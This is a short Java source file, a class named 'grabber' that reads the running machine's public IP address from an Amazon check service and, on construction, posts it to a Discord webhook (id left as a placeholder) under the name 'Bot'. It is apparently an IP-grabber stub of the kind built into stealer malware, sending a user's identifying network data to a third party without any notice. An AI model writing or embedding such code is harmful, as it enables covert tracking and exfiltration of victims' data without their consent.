package me.doundeway.future;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import java.net.URL;

public class grabber {
	
    public String IPgrab() throws IOException {
    	//Get ip 
    	URL ip = new URL("http://checkip.amazonaws.com");
    	BufferedReader reader = new BufferedReader(new InputStreamReader(ip.openStream()));
    	String final_ip = reader.readLine();
    	//send msg 
    	return String.valueOf(final_ip);
    	
    	
    }
    	
          sender webhook = new sender("https://discord.com/api/webhooks/{your webhook id}");
          grabber() throws IOException{
    	    	webhook.setContent(IPgrab());
    	    	webhook.setUsername("Bot");
    	    	webhook.execute();
    	    	
    	    
    	

}
}
